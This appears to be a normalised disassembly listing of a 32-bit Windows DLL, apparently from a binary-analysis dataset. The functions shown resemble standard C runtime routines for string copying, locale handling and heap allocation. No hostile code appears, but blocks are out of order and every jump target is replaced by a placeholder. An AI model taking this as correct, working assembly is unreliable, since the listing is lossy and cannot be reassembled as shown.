mov [ ebp - 0x1c ] edi
mov [ ebp - 0x28 ] edi
mov ebx [ ebp + 0x8 ]
cmp ebx 0xb
jg r-xdata
mov eax ebx
sub eax 0xf
je r-xdata
je r-xdata
mov esi rw-data
mov eax [ rw-data ]
sub eax 0x6
je r-xdata
call sub_100133ad
mov edi eax
mov [ ebp - 0x28 ] edi
test edi edi
jne r-xdata
mov eax ebx
push 0x2
pop ecx
sub eax ecx
je r-xdata
call sub_10012045
retn
cmp [ ebp - 0x20 ] eax
jne r-xdata
mov esi rw-data
mov eax [ rw-data ]
jmp r-xdata
dec eax
je r-xdata
push [ edi + 0x5c ]
mov edx ebx
call sub_100167d4
mov esi eax
add esi 0x8
mov eax [ esi ]
jmp r-xdata
or eax 0xffffffff
jmp r-xdata
mov esi rw-data
mov eax [ rw-data ]
jmp r-xdata
sub eax ecx
je r-xdata
cmp [ ebp - 0x1c ] eax
je r-xdata
push 0x3
call sub_1001248c
mov [ ebp - 0x1c ] 0x1
push eax
call sub_1001319d
mov esi rw-data
mov eax [ rw-data ]
jmp r-xdata
call sub_1001129f
mov [ eax ] 0x16
xor eax eax
push eax
push eax
push eax
push eax
push eax
call sub_10013956
add esp 0x14
jmp r-xdata
mov [ ebp - 0x20 ] eax
pop ecx
xor eax eax
cmp [ ebp - 0x20 ] 0x1
je r-xdata
sub eax ecx
je r-xdata
xor eax eax
mov [ ebp - 0x4 ] eax
cmp ebx 0x8
je r-xdata
push eax
call sub_10011508
pop ecx
sub eax ecx
jne r-xdata
mov ecx [ edi + 0x60 ]
mov [ ebp - 0x2c ] ecx
mov [ edi + 0x60 ] eax
cmp ebx 0x8
jne r-xdata
cmp ebx 0xb
je r-xdata
call sub_10013194
mov [ esi ] eax
mov ecx [ edi + 0x64 ]
mov [ ebp - 0x30 ] ecx
mov [ edi + 0x64 ] 0x8c
cmp ebx 0x4
jne r-xdata
push ebx
call [ ebp - 0x20 ]
push [ edi + 0x64 ]
push ebx
call [ ebp - 0x20 ]
pop ecx
jmp r-xdata
mov ecx [ rw-data ]
mov [ ebp - 0x24 ] ecx
cmp ebx 0x8
jne r-xdata
mov eax [ ebp - 0x2c ]
mov [ edi + 0x60 ] eax
cmp ebx 0x8
jne r-xdata
cmp ebx 0xb
je r-xdata
pop ecx
cmp ebx 0x8
je r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_1001698c
cmp ebx 0x8
jne r-xdata
mov ecx [ ebp - 0x24 ]
imul ecx ecx 0xc
mov edx [ edi + 0x5c ]
mov [ ecx + edx + 0x8 ] eax
inc [ ebp - 0x24 ]
jmp r-xdata
xor eax eax
mov eax [ ebp - 0x30 ]
mov [ edi + 0x64 ] eax
cmp ebx 0x4
jne r-xdata
mov ecx [ rw-data ]
mov edx [ rw-data ]
add ecx edx
cmp [ ebp - 0x24 ] ecx
jge r-xdata
sub_100169e6
mov edi edi
push ebp
mov ebp esp
sub esp 0x14
push ebx
push esi
push edi
call sub_10013194
and [ ebp - 0x4 ] 0x0
cmp [ rw-data ] 0x0
mov ebx eax
jne r-xdata
mov eax [ rw-data ]
cmp eax ebx
je r-xdata
push r--data
call [ LoadLibraryA@IAT ]
mov edi eax
test edi edi
je r-xdata
mov eax [ rw-data ]
cmp eax ebx
je r-xdata
cmp [ rw-data ] ebx
je r-xdata
xor eax eax
mov esi [ GetProcAddress@IAT ]
push r--data
push edi
call esi
test eax eax
je r-xdata
push [ rw-data ]
call sub_1001319d
pop ecx
test eax eax
je r-xdata
push eax
call sub_1001319d
pop ecx
test eax eax
je r-xdata
push eax
call sub_1001319d
push [ rw-data ]
mov esi eax
call sub_1001319d
pop ecx
pop ecx
mov edi eax
test esi esi
je r-xdata
push eax
call sub_10013122
mov [ esp ] r--data
push edi
mov [ rw-data ] eax
call esi
push eax
call sub_10013122
mov [ esp ] r--data
push edi
mov [ rw-data ] eax
call esi
push eax
call sub_10013122
mov [ esp ] r--data
push edi
mov [ rw-data ] eax
call esi
push eax
call sub_10013122
pop ecx
mov [ rw-data ] eax
test eax eax
je r-xdata
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
push [ ebp - 0x4 ]
call eax
jmp r-xdata
call eax
mov [ ebp - 0x4 ] eax
test eax eax
je r-xdata
test edi edi
je r-xdata
push r--data
push edi
call esi
push eax
call sub_10013122
pop ecx
mov [ rw-data ] eax
pop edi
pop esi
pop ebx
leave
retn
mov eax [ rw-data ]
cmp eax ebx
je r-xdata
call esi
test eax eax
je r-xdata
push eax
call sub_1001319d
pop ecx
test eax eax
je r-xdata
or [ ebp + 0x10 ] 0x200000
jmp r-xdata
lea ecx [ ebp - 0x8 ]
push ecx
push 0xc
lea ecx [ ebp - 0x14 ]
push ecx
push 0x1
push eax
call edi
test eax eax
je r-xdata
push [ ebp - 0x4 ]
call eax
mov [ ebp - 0x4 ] eax
test [ ebp - 0xc ] 0x1
jne r-xdata
sub_10016b4f
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
push ebx
xor ebx ebx
push esi
push edi
cmp eax ebx
je r-xdata
call sub_1001129f
push 0x16
pop esi
mov [ eax ] esi
mov edi [ ebp + 0xc ]
cmp edi ebx
ja r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
mov esi [ ebp + 0x10 ]
cmp esi ebx
jne r-xdata
mov edx eax
mov [ eax ] bl
jmp r-xdata
cmp edi ebx
je r-xdata
inc edx
dec edi
jne r-xdata
mov cl [ esi ]
mov [ edx ] cl
inc edx
inc esi
cmp cl bl
je r-xdata
cmp [ edx ] bl
je r-xdata
cmp edi ebx
jne r-xdata
dec edi
jne r-xdata
xor eax eax
mov [ eax ] bl
call sub_1001129f
push 0x22
pop ecx
mov [ eax ] ecx
mov esi ecx
jmp r-xdata
push ebx
push ebx
push ebx
push ebx
push ebx
call sub_10013956
add esp 0x14
mov eax esi
jmp r-xdata
sub_10016bc3
mov edi edi
push ebp
mov ebp esp
push ebx
push esi
mov esi [ ebp + 0x8 ]
xor ebx ebx
push edi
cmp [ ebp + 0x14 ] ebx
jne r-xdata
cmp esi ebx
je r-xdata
cmp esi ebx
jne r-xdata
call sub_1001129f
push 0x16
pop esi
mov [ eax ] esi
mov edi [ ebp + 0xc ]
cmp edi ebx
ja r-xdata
cmp [ ebp + 0xc ] ebx
jne r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
cmp [ ebp + 0x14 ] ebx
jne r-xdata
xor eax eax
mov edx [ ebp + 0x10 ]
cmp edx ebx
jne r-xdata
mov [ esi ] bl
jmp r-xdata
cmp [ ebp + 0x14 ] 0xffffffff
mov eax esi
jne r-xdata
mov [ esi ] bl
jmp r-xdata
mov cl [ edx ]
mov [ eax ] cl
inc eax
inc edx
cmp cl bl
je r-xdata
mov cl [ edx ]
mov [ eax ] cl
inc eax
inc edx
cmp cl bl
je r-xdata
cmp [ ebp + 0x14 ] ebx
jne r-xdata
dec edi
je r-xdata
cmp edi ebx
jne r-xdata
dec edi
jne r-xdata
mov [ eax ] bl
dec [ ebp + 0x14 ]
jne r-xdata
cmp [ ebp + 0x14 ] 0xffffffff
jne r-xdata
jmp r-xdata
mov [ esi ] bl
call sub_1001129f
push 0x22
pop ecx
mov [ eax ] ecx
mov esi ecx
jmp r-xdata
mov eax [ ebp + 0xc ]
push 0x50
mov [ esi + eax - 0x1 ] bl
pop eax
jmp r-xdata
push ebx
push ebx
push ebx
push ebx
push ebx
call sub_10013956
add esp 0x14
mov eax esi
jmp r-xdata
sub_10016c78
mov edi edi
push ebp
mov ebp esp
mov ecx [ ebp + 0x8 ]
push ebx
xor ebx ebx
push esi
push edi
cmp ecx ebx
je r-xdata
call sub_1001129f
push 0x16
pop esi
mov [ eax ] esi
mov edi [ ebp + 0xc ]
cmp edi ebx
ja r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
mov esi [ ebp + 0x10 ]
cmp esi ebx
jne r-xdata
mov edx ecx
mov [ ecx ] bl
jmp r-xdata
cmp edi ebx
jne r-xdata
dec edi
jne r-xdata
xor eax eax
mov [ ecx ] bl
call sub_1001129f
push 0x22
pop ecx
mov [ eax ] ecx
mov esi ecx
jmp r-xdata
mov al [ esi ]
mov [ edx ] al
inc edx
inc esi
cmp al bl
je r-xdata
push ebx
push ebx
push ebx
push ebx
push ebx
call sub_10013956
add esp 0x14
mov eax esi
jmp r-xdata
sub_10016ce0
mov edi edi
push ebp
mov ebp esp
mov ecx [ ebp + 0x8 ]
push esi
xor esi esi
cmp ecx esi
jl r-xdata
call sub_1001129f
push esi
push esi
push esi
push esi
push esi
mov [ eax ] 0x16
call sub_10013956
add esp 0x14
or eax 0xffffffff
cmp ecx 0x2
jle r-xdata
mov eax [ rw-data ]
mov [ rw-data ] ecx
jmp r-xdata
cmp ecx 0x3
jne r-xdata
pop esi
pop ebp
retn
mov eax [ rw-data ]
jmp r-xdata
sub_10016d2b
mov edi edi
push ebp
mov ebp esp
push ecx
push ecx
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ rw-data ]
push ebx
push esi
xor ebx ebx
push edi
mov edi ecx
cmp eax ebx
jne r-xdata
cmp eax 0x2
je r-xdata
lea eax [ ebp - 0x8 ]
push eax
xor esi esi
inc esi
push esi
push r--data
push esi
call [ GetStringTypeW@IAT ]
test eax eax
je r-xdata
xor esi esi
cmp [ ebp + 0x1c ] ebx
jne r-xdata
cmp eax ebx
je r-xdata
call [ GetLastError@IAT ]
cmp eax 0x78
jne r-xdata
mov [ rw-data ] esi
jmp r-xdata
cmp [ ebp + 0x18 ] ebx
jne r-xdata
mov eax [ edi ]
mov eax [ eax + 0x14 ]
mov [ ebp + 0x1c ] eax
cmp eax 0x1
jne r-xdata
mov eax [ rw-data ]
push 0x2
pop eax
mov [ rw-data ] eax
jmp r-xdata
mov [ ebp - 0x8 ] ebx
cmp [ ebp + 0x18 ] ebx
jne r-xdata
push [ ebp + 0x1c ]
call sub_10017745
pop ecx
cmp eax 0xffffffff
jne r-xdata
mov eax [ edi ]
mov eax [ eax + 0x4 ]
mov [ ebp + 0x18 ] eax
xor eax eax
jmp r-xdata
mov esi [ MultiByteToWideChar@IAT ]
xor eax eax
cmp [ ebp + 0x20 ] ebx
push ebx
push ebx
push [ ebp + 0x10 ]
setne al
push [ ebp + 0xc ]
lea eax [ eax * 8 + 0x1 ]
push eax
push [ ebp + 0x18 ]
call esi
mov edi eax
cmp edi ebx
je r-xdata
mov eax [ edi ]
mov eax [ eax + 0x4 ]
mov [ ebp + 0x18 ] eax
cmp eax [ ebp + 0x18 ]
je r-xdata
lea esp [ ebp - 0x14 ]
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_1000fe6e
leave
retn
jle r-xdata
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
push [ ebp + 0x1c ]
call [ GetStringTypeA@IAT ]
mov edi eax
cmp esi ebx
je r-xdata
push ebx
push ebx
lea ecx [ ebp + 0x10 ]
push ecx
push [ ebp + 0xc ]
push eax
push [ ebp + 0x18 ]
call sub_1001778e
mov esi eax
add esp 0x18
cmp esi ebx
je r-xdata
test ebx ebx
je r-xdata
cmp edi 0x7ffffff0
ja r-xdata
mov eax edi
push esi
call sub_1000fe7d
pop ecx
mov [ ebp + 0xc ] esi
lea eax [ edi + edi ]
push eax
push 0x0
push ebx
call sub_10010a00
add esp 0xc
push edi
push ebx
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push 0x1
push [ ebp + 0x18 ]
call esi
test eax eax
je r-xdata
lea eax [ edi + edi + 0x8 ]
cmp eax 0x400
ja r-xdata
push ebx
call sub_10013d7f
mov eax [ ebp - 0x8 ]
pop ecx
jmp r-xdata
push [ ebp + 0x14 ]
push eax
push ebx
push [ ebp + 0x8 ]
call [ GetStringTypeW@IAT ]
mov [ ebp - 0x8 ] eax
push eax
call sub_1000ff5a
pop ecx
cmp eax ebx
je r-xdata
call sub_10017950
mov eax esp
cmp eax ebx
je r-xdata
mov ebx eax
mov [ eax ] 0xdddd
mov [ eax ] 0xcccc
jmp r-xdata
add eax 0x8
sub_10016ee5
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push [ ebp + 0x8 ]
lea ecx [ ebp - 0x10 ]
call sub_10010024
push [ ebp + 0x24 ]
lea ecx [ ebp - 0x10 ]
push [ ebp + 0x20 ]
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
call sub_10016d2b
add esp 0x1c
cmp [ ebp - 0x4 ] 0x0
je r-xdata
leave
retn
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
sub_10016f27
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
test esi esi
je r-xdata
pop esi
pop ebp
retn
push [ esi + 0x4 ]
call sub_1000fe7d
push [ esi + 0x8 ]
call sub_1000fe7d
push [ esi + 0xc ]
call sub_1000fe7d
push [ esi + 0x10 ]
call sub_1000fe7d
push [ esi + 0x14 ]
call sub_1000fe7d
push [ esi + 0x18 ]
call sub_1000fe7d
push [ esi ]
call sub_1000fe7d
push [ esi + 0x20 ]
call sub_1000fe7d
push [ esi + 0x24 ]
call sub_1000fe7d
push [ esi + 0x28 ]
call sub_1000fe7d
push [ esi + 0x2c ]
call sub_1000fe7d
push [ esi + 0x30 ]
call sub_1000fe7d
push [ esi + 0x34 ]
call sub_1000fe7d
push [ esi + 0x1c ]
call sub_1000fe7d
push [ esi + 0x38 ]
call sub_1000fe7d
push [ esi + 0x3c ]
call sub_1000fe7d
add esp 0x40
push [ esi + 0x40 ]
call sub_1000fe7d
push [ esi + 0x44 ]
call sub_1000fe7d
push [ esi + 0x48 ]
call sub_1000fe7d
push [ esi + 0x4c ]
call sub_1000fe7d
push [ esi + 0x50 ]
call sub_1000fe7d
push [ esi + 0x54 ]
call sub_1000fe7d
push [ esi + 0x58 ]
call sub_1000fe7d
push [ esi + 0x5c ]
call sub_1000fe7d
push [ esi + 0x60 ]
call sub_1000fe7d
push [ esi + 0x64 ]
call sub_1000fe7d
push [ esi + 0x68 ]
call sub_1000fe7d
push [ esi + 0x6c ]
call sub_1000fe7d
push [ esi + 0x70 ]
call sub_1000fe7d
push [ esi + 0x74 ]
call sub_1000fe7d
push [ esi + 0x78 ]
call sub_1000fe7d
push [ esi + 0x7c ]
call sub_1000fe7d
add esp 0x40
push [ esi + 0x80 ]
call sub_1000fe7d
push [ esi + 0x84 ]
call sub_1000fe7d
push [ esi + 0x88 ]
call sub_1000fe7d
push [ esi + 0x8c ]
call sub_1000fe7d
push [ esi + 0x90 ]
call sub_1000fe7d
push [ esi + 0x94 ]
call sub_1000fe7d
push [ esi + 0x98 ]
call sub_1000fe7d
push [ esi + 0x9c ]
call sub_1000fe7d
push [ esi + 0xa0 ]
call sub_1000fe7d
push [ esi + 0xa4 ]
call sub_1000fe7d
push [ esi + 0xa8 ]
call sub_1000fe7d
add esp 0x2c
sub_100170bc
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
test esi esi
je r-xdata
pop esi
pop ebp
retn
mov eax [ esi ]
cmp eax [ rw-data ]
je r-xdata
mov eax [ esi + 0x4 ]
cmp eax [ rw-data ]
je r-xdata
push eax
call sub_1000fe7d
pop ecx
mov esi [ esi + 0x8 ]
cmp esi [ rw-data ]
je r-xdata
push eax
call sub_1000fe7d
pop ecx
push esi
call sub_1000fe7d
pop ecx
sub_10017101
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
test esi esi
je r-xdata
pop esi
pop ebp
retn
mov eax [ esi + 0xc ]
cmp eax [ rw-data ]
je r-xdata
mov eax [ esi + 0x10 ]
cmp eax [ rw-data ]
je r-xdata
push eax
call sub_1000fe7d
pop ecx
mov eax [ esi + 0x14 ]
cmp eax [ rw-data ]
je r-xdata
push eax
call sub_1000fe7d
pop ecx
mov eax [ esi + 0x18 ]
cmp eax [ rw-data ]
je r-xdata
push eax
call sub_1000fe7d
pop ecx
mov eax [ esi + 0x1c ]
cmp eax [ rw-data ]
je r-xdata
push eax
call sub_1000fe7d
pop ecx
mov eax [ esi + 0x20 ]
cmp eax [ rw-data ]
je r-xdata
push eax
call sub_1000fe7d
pop ecx
mov esi [ esi + 0x24 ]
cmp esi [ rw-data ]
je r-xdata
push eax
call sub_1000fe7d
pop ecx
push esi
call sub_1000fe7d
pop ecx
sub_10017190
push ebp
mov ebp esp
push esi
xor eax eax
push eax
push eax
push eax
push eax
push eax
push eax
push eax
push eax
mov edx [ ebp + 0xc ]
lea ecx [ ecx ]
mov esi [ ebp + 0x8 ]
or ecx 0xffffffff
lea ecx [ ecx ]
add edx 0x1
bts [ esp ] eax
jmp r-xdata
mov eax ecx
add esp 0x20
pop esi
leave
retn
add esi 0x1
bt [ esp ] eax
jae r-xdata
mov al [ edx ]
or al al
je r-xdata
add ecx 0x1
mov al [ esi ]
or al al
je r-xdata
sub_100171e0
mov edx [ esp + 0x4 ]
mov ecx [ esp + 0x8 ]
test edx 0x3
jne r-xdata
test edx 0x1
je r-xdata
mov eax [ edx ]
cmp al [ ecx ]
jne r-xdata
mov ax [ edx ]
add edx 0x2
cmp al [ ecx ]
jne r-xdata
mov al [ edx ]
add edx 0x1
cmp al [ ecx ]
jne r-xdata
sbb eax eax
shl eax 0x1
add eax 0x1
retn
or al al
je r-xdata
or al al
je r-xdata
add ecx 0x1
or al al
je r-xdata
xor eax eax
retn
cmp ah [ ecx + 0x1 ]
jne r-xdata
cmp ah [ ecx + 0x1 ]
jne r-xdata
test edx 0x2
je r-xdata
or ah ah
je r-xdata
or ah ah
je r-xdata
shr eax 0x10
cmp al [ ecx + 0x2 ]
jne r-xdata
add ecx 0x2
jmp r-xdata
or al al
je r-xdata
cmp ah [ ecx + 0x3 ]
jne r-xdata
add ecx 0x4
add edx 0x4
or ah ah
jne r-xdata
mov edi edi
sub_10017270
push ebp
mov ebp esp
push esi
xor eax eax
push eax
push eax
push eax
push eax
push eax
push eax
push eax
push eax
mov edx [ ebp + 0xc ]
lea ecx [ ecx ]
mov esi [ ebp + 0x8 ]
mov edi edi
add edx 0x1
bts [ esp ] eax
jmp r-xdata
add esp 0x20
pop esi
leave
retn
add esi 0x1
bt [ esp ] eax
jae r-xdata
mov al [ edx ]
or al al
je r-xdata
mov al [ esi ]
or al al
je r-xdata
lea eax [ esi - 0x1 ]
sub_100172b0
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push [ ebp + 0x8 ]
lea ecx [ ebp - 0x10 ]
call sub_10010024
mov eax [ ebp + 0x18 ]
test eax eax
jle r-xdata
push [ ebp + 0x20 ]
push [ ebp + 0x1c ]
push eax
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
call [ LCMapStringW@IAT ]
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov ecx [ ebp + 0x14 ]
mov edx eax
leave
retn
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
sub eax edx
dec eax
inc ecx
inc ecx
test edx edx
jne r-xdata
dec edx
cmp [ ecx ] 0x0
je r-xdata
or edx 0xffffffff
sub_10017307
mov edi edi
push ebp
mov ebp esp
mov eax 0xffff
sub esp 0x14
cmp [ ebp + 0x8 ] ax
jne r-xdata
mov eax 0x100
cmp [ ebp + 0x8 ] ax
jae r-xdata
and [ ebp - 0x4 ] 0x0
jmp r-xdata
push [ ebp + 0x10 ]
lea ecx [ ebp - 0x14 ]
call sub_10010024
mov eax [ ebp - 0x14 ]
push [ eax + 0x14 ]
push [ eax + 0x4 ]
lea eax [ ebp - 0x4 ]
push eax
push 0x1
lea eax [ ebp + 0x8 ]
push eax
lea eax [ ebp - 0x14 ]
push 0x1
push eax
call sub_10018e51
add esp 0x1c
test eax eax
jne r-xdata
movzx eax [ ebp + 0x8 ]
mov ecx [ rw-data ]
mov ax [ ecx + eax * 2 ]
and ax [ ebp + 0xc ]
movzx eax ax
mov [ ebp - 0x4 ] eax
jmp r-xdata
movzx eax [ ebp - 0x4 ]
movzx ecx [ ebp + 0xc ]
and eax ecx
leave
retn
cmp [ ebp - 0x8 ] 0x0
je r-xdata
and [ ebp - 0x4 ] eax
mov eax [ ebp - 0xc ]
and [ eax + 0x70 ] 0xfffffffd
sub_10017391
push 0xc
push r--data
call sub_10012000
mov ecx [ ebp + 0x8 ]
xor edi edi
cmp ecx edi
jbe r-xdata
imul ecx [ ebp + 0xc ]
mov esi ecx
mov [ ebp + 0x8 ] esi
cmp esi edi
jne r-xdata
push 0xffffffe0
pop eax
xor edx edx
div ecx
cmp eax [ ebp + 0xc ]
sbb eax eax
inc eax
jne r-xdata
xor ebx ebx
mov [ ebp - 0x1c ] ebx
cmp esi 0xffffffe0
ja r-xdata
xor esi esi
inc esi
call sub_1001129f
mov [ eax ] 0xc
push edi
push edi
push edi
push edi
push edi
call sub_10013956
add esp 0x14
cmp ebx edi
jne r-xdata
cmp [ rw-data ] 0x3
jne r-xdata
call sub_10012045
retn
mov eax ebx
cmp [ rw-data ] edi
je r-xdata
cmp ebx edi
jne r-xdata
add esi 0xf
and esi 0xfffffff0
mov [ ebp + 0xc ] esi
mov eax [ ebp + 0x8 ]
cmp eax [ rw-data ]
ja r-xdata
cmp ebx edi
jne r-xdata
push esi
call sub_100126f2
pop ecx
test eax eax
jne r-xdata
push esi
push 0x8
push [ rw-data ]
call [ HeapAlloc@IAT ]
mov ebx eax
push 0x4
call sub_10011508
pop ecx
mov [ ebp - 0x4 ] edi
push [ ebp + 0x8 ]
call sub_10011d1a
pop ecx
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x4 ] 0xfffffffe
call sub_1001748d
mov ebx [ ebp - 0x1c ]
cmp ebx edi
je r-xdata
mov eax [ ebp + 0x10 ]
cmp eax edi
je r-xdata
mov eax [ ebp + 0x10 ]
cmp eax edi
je r-xdata
push [ ebp + 0x8 ]
push edi
push ebx
call sub_10010a00
add esp 0xc
mov [ eax ] 0xc
xor eax eax
jmp r-xdata
mov [ eax ] 0xc
jmp r-xdata
sub_100174af
push 0x10
push r--data
call sub_10012000
mov ebx [ ebp + 0x8 ]
test ebx ebx
jne r-xdata
mov esi [ ebp + 0xc ]
test esi esi
jne r-xdata
push [ ebp + 0xc ]
call sub_1000ff5a
pop ecx
jmp r-xdata
cmp [ rw-data ] 0x3
jne r-xdata
push ebx
call sub_1000fe7d
pop ecx
jmp r-xdata
call sub_10012045
retn
cmp esi 0xffffffe0
jbe r-xdata
xor edi edi
mov [ ebp - 0x1c ] edi
cmp esi 0xffffffe0
ja r-xdata
xor eax eax
test esi esi
jne r-xdata
push esi
call sub_100126f2
pop ecx
call sub_1001129f
push 0x4
call sub_10011508
pop ecx
mov [ ebp - 0x4 ] edi
push ebx
call sub_1001153b
pop ecx
mov [ ebp - 0x20 ] eax
cmp eax edi
je r-xdata
push esi
push ebx
push 0x0
push [ rw-data ]
call [ HeapReAlloc@IAT ]
mov edi eax
test edi edi
jne r-xdata
inc esi
mov [ ebp - 0x4 ] 0xfffffffe
call sub_100175f3
cmp [ ebp - 0x20 ] 0x0
jne r-xdata
cmp esi [ rw-data ]
ja r-xdata
mov eax edi
jmp r-xdata
cmp [ rw-data ] eax
je r-xdata
mov edi [ ebp - 0x1c ]
test esi esi
jne r-xdata
cmp [ ebp - 0x1c ] edi
jne r-xdata
push esi
push ebx
push eax
call sub_10011a39
add esp 0xc
test eax eax
je r-xdata
test edi edi
jne r-xdata
push esi
call sub_100126f2
pop ecx
test eax eax
je r-xdata
cmp [ rw-data ] edi
je r-xdata
add esi 0xf
and esi 0xfffffff0
mov [ ebp + 0xc ] esi
push esi
push ebx
push 0x0
push [ rw-data ]
call [ HeapReAlloc@IAT ]
mov edi eax
jmp r-xdata
inc esi
cmp esi edi
jne r-xdata
push esi
call sub_10011d1a
pop ecx
mov [ ebp - 0x1c ] eax
cmp eax edi
je r-xdata
mov [ ebp - 0x1c ] ebx
jmp r-xdata
call sub_1001129f
call sub_1001129f
jmp r-xdata
test edi edi
jne r-xdata
push esi
call sub_100126f2
pop ecx
test eax eax
jne r-xdata
test edi edi
jne r-xdata
add esi 0xf
and esi 0xfffffff0
mov [ ebp + 0xc ] esi
push esi
push edi
push [ rw-data ]
call [ HeapAlloc@IAT ]
mov [ ebp - 0x1c ] eax
cmp eax edi
je r-xdata
xor esi esi
inc esi
mov [ ebp + 0xc ] esi
mov eax [ ebx - 0x4 ]
dec eax
cmp eax esi
jb r-xdata
mov esi eax
call [ GetLastError@IAT ]
push eax
call sub_1001125d
pop ecx
mov [ esi ] eax
jmp r-xdata
call sub_1001129f
cmp [ ebp - 0x20 ] edi
je r-xdata
call sub_1001129f
cmp [ ebp - 0x20 ] edi
jne r-xdata
mov eax [ ebx - 0x4 ]
dec eax
cmp eax esi
jb r-xdata
push eax
push ebx
push [ ebp - 0x1c ]
call sub_10010ab0
push ebx
call sub_1001153b
mov [ ebp - 0x20 ] eax
push ebx
push eax
call sub_1001156b
add esp 0x18
mov eax esi
mov esi eax
call [ GetLastError@IAT ]
push eax
call sub_1001125d
mov [ esi ] eax
pop ecx
mov [ eax ] 0xc
jmp r-xdata
mov [ eax ] 0xc
push eax
push ebx
push [ ebp - 0x1c ]
call sub_10010ab0
push ebx
push [ ebp - 0x20 ]
call sub_1001156b
add esp 0x14
mov eax esi
sub_100176ca
mov edi edi
push ebp
mov ebp esp
mov ecx [ ebp + 0xc ]
push ebx
xor ebx ebx
cmp ecx ebx
jbe r-xdata
imul ecx [ ebp + 0x10 ]
push esi
push edi
mov esi ecx
cmp [ ebp + 0x8 ] ebx
je r-xdata
push 0xffffffe0
xor edx edx
pop eax
div ecx
cmp eax [ ebp + 0x10 ]
jae r-xdata
push esi
push [ ebp + 0x8 ]
call sub_100174af
mov edi eax
pop ecx
pop ecx
test edi edi
je r-xdata
push [ ebp + 0x8 ]
call sub_100183ee
pop ecx
mov ebx eax
call sub_1001129f
push ebx
push ebx
push ebx
push ebx
push ebx
mov [ eax ] 0xc
call sub_10013956
add esp 0x14
xor eax eax
jmp r-xdata
mov eax edi
pop edi
pop esi
cmp ebx esi
jae r-xdata
pop ebx
pop ebp
retn
sub esi ebx
push esi
push 0x0
add ebx edi
push ebx
call sub_10010a00
add esp 0xc
sub_10017745
mov edi edi
push ebp
mov ebp esp
sub esp 0xc
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push 0x6
lea eax [ ebp - 0xc ]
push eax
push 0x1004
push [ ebp + 0x8 ]
mov [ ebp - 0x6 ] 0x0
call [ GetLocaleInfoA@IAT ]
test eax eax
jne r-xdata
lea eax [ ebp - 0xc ]
push eax
call sub_10018ceb
pop ecx
or eax 0xffffffff
jmp r-xdata
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_1000fe6e
leave
retn
sub_1001778e
mov edi edi
push ebp
mov ebp esp
sub esp 0x34
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x10 ]
mov ecx [ ebp + 0x18 ]
mov [ ebp - 0x28 ] eax
mov eax [ ebp + 0x14 ]
push ebx
mov [ ebp - 0x30 ] eax
mov eax [ eax ]
push esi
mov [ ebp - 0x24 ] eax
mov eax [ ebp + 0x8 ]
push edi
xor edi edi
mov [ ebp - 0x34 ] ecx
mov [ ebp - 0x20 ] edi
mov [ ebp - 0x2c ] edi
cmp eax [ ebp + 0xc ]
je r-xdata
mov eax [ ebp - 0x20 ]
mov esi [ GetCPInfo@IAT ]
lea ecx [ ebp - 0x18 ]
push ecx
push eax
call esi
mov ebx [ MultiByteToWideChar@IAT ]
test eax eax
je r-xdata
push edi
push edi
push [ ebp - 0x24 ]
push [ ebp - 0x28 ]
push 0x1
push [ ebp + 0x8 ]
call ebx
mov esi eax
cmp esi edi
jne r-xdata
cmp [ ebp - 0x18 ] 0x1
jne r-xdata
jle r-xdata
xor eax eax
jmp r-xdata
lea eax [ ebp - 0x18 ]
push eax
push [ ebp + 0xc ]
call esi
test eax eax
je r-xdata
mov [ ebp - 0x1c ] edi
cmp esi 0x7ffffff0
ja r-xdata
lea esp [ ebp - 0x40 ]
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_1000fe6e
leave
retn
cmp [ ebp - 0x18 ] 0x1
jne r-xdata
lea eax [ esi + esi ]
push eax
push edi
push [ ebp - 0x1c ]
call sub_10010a00
add esp 0xc
push esi
push [ ebp - 0x1c ]
push [ ebp - 0x24 ]
push [ ebp - 0x28 ]
push 0x1
push [ ebp + 0x8 ]
call ebx
test eax eax
je r-xdata
lea eax [ esi + esi + 0x8 ]
cmp eax 0x400
ja r-xdata
mov esi [ ebp - 0x24 ]
mov [ ebp - 0x2c ] 0x1
cmp esi 0xffffffff
jne r-xdata
push [ ebp - 0x1c ]
call sub_10013d7f
pop ecx
mov ebx [ ebp - 0x34 ]
cmp ebx edi
je r-xdata
push eax
call sub_1000ff5a
pop ecx
cmp eax edi
je r-xdata
call sub_10017950
mov eax esp
cmp eax edi
je r-xdata
cmp esi edi
push [ ebp - 0x28 ]
call sub_10016180
mov esi eax
pop ecx
inc esi
mov ebx [ WideCharToMultiByte@IAT ]
cmp [ ebp - 0x2c ] edi
jne r-xdata
push edi
push edi
push [ ebp + 0x1c ]
push ebx
push esi
push [ ebp - 0x1c ]
push edi
push [ ebp + 0xc ]
call [ WideCharToMultiByte@IAT ]
test eax eax
je r-xdata
mov [ ebp - 0x1c ] eax
jmp r-xdata
mov [ eax ] 0xdddd
